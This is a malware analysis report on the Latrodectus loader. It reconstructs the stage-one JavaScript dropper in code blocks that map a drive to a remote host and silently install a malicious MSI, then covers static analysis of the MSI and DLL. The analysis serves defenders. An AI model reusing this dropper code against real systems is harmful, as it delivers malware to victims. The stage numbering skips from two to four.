# Latredocus Exposed: Unraveling the New Cyber Threat


## Overview

In this report, we delve into the intricate details of Latrodectus, a new and sophisticated malware loader that has surfaced in the cybersecurity landscape. First identified in phishing campaigns in early March 2024, Latrodectus is believed to be the successor to the notorious IcedID malware. This report aims to provide a comprehensive analysis of Latrodectus, including its infection chain, capabilities, and the broader implications for cybersecurity.


## Infection Chain and Distribution

The initial discovery of Latrodectus was made through a surge in email phishing campaigns. These campaigns commonly use oversized JavaScript files that exploit Windows Management Instrumentation (WMI) to invoke msiexec.exe and install a malicious MSI file from a WEBDAV share. This infection chain is a sophisticated method that leverages well-known system utilities to avoid detection.

## Technical Analysis

Latrodectus exemplifies the evolution of malware sophistication, integrating advanced techniques to infiltrate, persist, and evade detection on compromised systems. This technical analysis delves into the specifics of its infection chain, operational capabilities, evasion strategies, persistence mechanisms, and command-and-control (C2) communication protocols. Understanding these facets is crucial for cybersecurity professionals aiming to effectively detect, analyze, and counteract the threat posed by Latrodectus.

### Stage : 1 
#### Javascript Payload
``` 
MD5 hash : 7d42412a93368417fed25f581c536e5a
```
This JavaScript code performs network drive mapping, installs an MSI package, and can execute additional embedded code. Here's a breakdown:

#### Key Variables and Function

1. **Setup Objects:**
   ```javascript
   var network = new ActiveXObject("WScript.Network");
   var wmi = GetObject("winmgmts:\\\\.\\root\\cimv2");
   var attempt = 0;
   var connected = false;
   ```
   The above code snippet is trying to interact with network resources using Windows Script Host's network capabilities through ActiveXObject. It also uses WMI to manage system information, trying to check for connectivity by setting a flag after attempting a connection.

2. **Check if Drive is Mapped:**
   ```javascript
   function isDriveMapped(letter) {
       var drives = network.EnumNetworkDrives();
       for (var i = 0; i < drives.length; i += 2) {
           if (drives.Item(i) === letter) {
               return true;
           }
       }
       return false;
   }
   ```
   The code snippet uses `EnumNetworkDrives()` to check if a specific drive letter (`letter`) is currently mapped on the system. This method is commonly utilized by malware to identify network resources accessible from an infected machine. By determining mapped drives, malware can potentially spread across network shares, access sensitive data, or execute further malicious activities within the network environment. 

#### Drive Mapping Logic

3. **Try Mapping Drives from 'Z' to 'A':**
   ```javascript
   for (var driveLetter = 90; driveLetter >= 65 && !connected; driveLetter--) {
       var letter = String.fromCharCode(driveLetter) + ":";
       if (!isDriveMapped(letter)) {
           try {
               network.MapNetworkDrive(letter, "\\\\95.164.3.171@80\\share\\");
               connected = true;
               break;
           } catch (e) {
               attempt++;
           }
       }
   }
   ```
   This snippet attempts to map network drives from Z: to A: (corresponding to drive letters 90 to 65) until it successfully maps to "\\95.164.3.171@80\share\" or exhausts all attempts. It uses `MapNetworkDrive()` to connect to a remote share, potentially allowing malware to access or spread across network resources, a common tactic for ```lateral movement``` in cyberattacks.

4. **Fallback Mapping with `net use`:**
   ```javascript
   if (!connected && attempt > 5) {
       var command = 'net use ' + letter + ' \\\\95.164.3.171@80\\share\\ /persistent:no';
       wmi.Get("Win32_Process").Create(command, null, null, null);

       var startTime = new Date();
       while (new Date() - startTime < 3000) {} // Wait 3 seconds

       connected = isDriveMapped(letter);
   }
   ```
The above JavaScript snippet verifies whether the network drive connection failed and if the number of attempts exceeds 5. If these conditions are met, it utilizes WMI (`Win32_Process`) to execute a command (`net use`) that maps the network drive `letter` to "\\95.164.3.171@80\share\" without persistence. Following execution, it includes a 3-second wait period to confirm the successful mapping of the drive (`isDriveMapped(letter)` returning true).

#### MSI Installation

5. **Install MSI if Connected:**
   ```javascript
   if (connected) {
       var installCommand = 'msiexec.exe /i \\\\95.164.3.171@80\\share\\cisa.msi /qn';
       wmi.Get("Win32_Process").Create(installCommand, null, null, null);

       try {
           network.RemoveNetworkDrive(letter, true, true);
       } catch (e) {}
   } else {
       WScript.Echo("Failed.");
   }
   ```
   The important part of the code snippet is the execution of the `msiexec.exe` command (`'msiexec.exe /i \\\\95.164.3.171@80\\share\\cisa.msi /qn'`) using WMI (`Win32_Process`). This command attempts to silently install an MSI package (`cisa.msi`) located on a remote share (`\\95.164.3.171@80\share`). If `connected` is true (indicating successful network drive mapping), the installation proceeds; otherwise, an error message is echoed via `WScript.Echo("Failed.")`.



### Stage : 2 
#### Basic Static Analysis of the MSI File
``` 
MD5 hash : c4e8f3e02fd50a4051f11048f1355726
```
As previously mentioned, the next phase of the attack involves the deployment of a malicious .msi file on the victim's machine. To unveil the intricacies of this payload, we turn to Orca, a powerful tool for dissecting MSI files. What we discovered through this analysis is both alarming and fascinating.

When we cracked open the .msi file using Orca, we found a treasure trove of malicious components carefully hidden within. This file is not just a simple installer; itâ€™s a cleverly disguised arsenal designed to establish a foothold on the target system.

### Stage : 4 
####  Static Analysis of the payload : - Payload.dll
```
MD5 hash : 703ffdc708f1f0779bb0f6da1b8cbc9a
file type : PE32+ executable (DLL) (GUI) x86-64, for MS Windows
```
Upon encountering gibberish output from normal string analysis, we opted to employ ```FLOSS``` for deeper insights into the binary's string contents. 
It is generally observed that malware authors tend to use certain known or custom encryption schemes to hide thge actual activity from analysts and make the process of analysis a tedious process.
However we have tools like ```FLOSS``` which uses advanced static analysis techniques to deobfuscate the strings.
